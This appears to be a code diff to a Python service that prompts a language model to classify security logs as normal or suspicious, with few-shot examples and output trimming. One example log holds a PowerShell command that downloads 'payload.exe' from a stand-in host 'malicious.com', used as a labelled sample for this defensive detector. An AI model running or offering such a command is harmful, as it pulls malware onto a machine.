@@ -88,30 +88,44 @@ class MLService:
     
     def _format_prompt(self, log_input: str) -> str:
         """
-        Format logs using THE EXACT TRAINING FORMAT.
+        Format logs using FEW-SHOT PROMPTING from metrics.ipynb.
         
-        CRITICAL: Must match the exact instruction+input format from training data.
-        
-        Training format:
-          instruction: "Analyze this session log chunk and determine if it contains normal or suspicious activity. If suspicious, identify all MITRE ATT&CK techniques and explain why."
-          input: "{json}"
-          output: "Status: Normal\nReason: ..." OR "Status: Suspicious\nMITRE Techniques: T1234\nReason: ..."
+        CRITICAL: This matches the exact approach used in metrics.ipynb that achieved 70%+ F1 score.
+        The few-shot examples guide the model to output the correct format.
         
         Args:
             log_input: Raw log content (JSON string)
             
         Returns:
-            Formatted prompt string matching EXACT training format
+            Formatted few-shot prompt matching metrics.ipynb
         """
         # Truncate if too long (matching metrics notebook: 6000 chars)
         if len(log_input) > settings.MAX_INPUT_CHARS:
             log_input = log_input[:settings.MAX_INPUT_CHARS] + "... [truncated]"
         
-        # EXACT instruction from training data
-        instruction = "Analyze this session log chunk and determine if it contains normal or suspicious activity. If suspicious, identify all MITRE ATT&CK techniques and explain why."
-        
-        # Simple instruction+input format (matching training EXACTLY)
-        prompt = f"{instruction}\n\nInput: {log_input}\n\nOutput:"
+        # FEW-SHOT PROMPT from metrics.ipynb (Cell 8) - THIS IS WHAT WORKED
+        prompt = f"""You are a cybersecurity analyst. Analyze system logs and determine if they show normal or suspicious activity.
+
+Output format:
+Status: Normal OR Status: Suspicious
+Reason: Brief explanation
+
+### Example 1:
+Input: {{"EventID": 4624, "LogonType": 2, "Account": "user@domain.com", "Workstation": "DESKTOP-123"}}
+Response:
+Status: Normal
+Reason: Standard interactive logon (LogonType 2) from a legitimate user account on a known workstation. No indicators of compromise.
+
+### Example 2:
+Input: {{"EventID": 4688, "Process": "powershell.exe", "CommandLine": "Invoke-WebRequest http://malicious.com/payload.exe -OutFile C:\\\\temp\\\\mal.exe", "User": "SYSTEM"}}
+Response:
+Status: Suspicious
+Reason: PowerShell executing under SYSTEM context downloading executable from external site - indicates potential malware download (T1105 - Ingress Tool Transfer).
+
+### Now analyze this log:
+Input: {log_input}
+Response:
+"""
         
         return prompt
     
@@ -269,7 +283,37 @@ class MLService:
                 skip_special_tokens=True
             )
             
-            logger.info(f"Generated {len(generated_text)} characters")
+            logger.info(f"Generated {len(generated_text)} characters (before cleanup)")
+            
+            # Post-process: Remove conversational follow-ups and unwanted continuations
+            # The model sometimes continues generating after the Reason, adding conversational text
+            stopping_patterns = [
+                "\n\nPlease note",      # Common continuation pattern
+                "\n\nHuman:",           # Chat-style continuation
+                "\n\nAssistant:",       # Chat-style continuation
+                "\n\nInput:",           # Trying to analyze another log
+                "\n\n### Example",      # Trying to give more examples
+                "\n\nCan you",          # Asking follow-up questions
+                "\n\nNote:",            # Additional notes
+                "\n\n###",              # New section markers
+                "\n\n---",              # Separator lines
+                "\n\nI ",               # First-person continuation
+                "\n\nThe analysis",     # Meta-commentary
+                "Human:",               # Without double newline
+                "Assistant:",           # Without double newline
+            ]
+            
+            original_length = len(generated_text)
+            for pattern in stopping_patterns:
+                if pattern in generated_text:
+                    generated_text = generated_text.split(pattern)[0]
+                    logger.info(f"Trimmed at '{pattern}': {original_length} -> {len(generated_text)} chars")
+                    break
+            
+            # Also trim if response ends with incomplete sentence after trimming
+            generated_text = generated_text.rstrip()
+            
+            logger.info(f"Final output: {len(generated_text)} characters")
             
             # Parse output
             result = self._parse_output(generated_text)
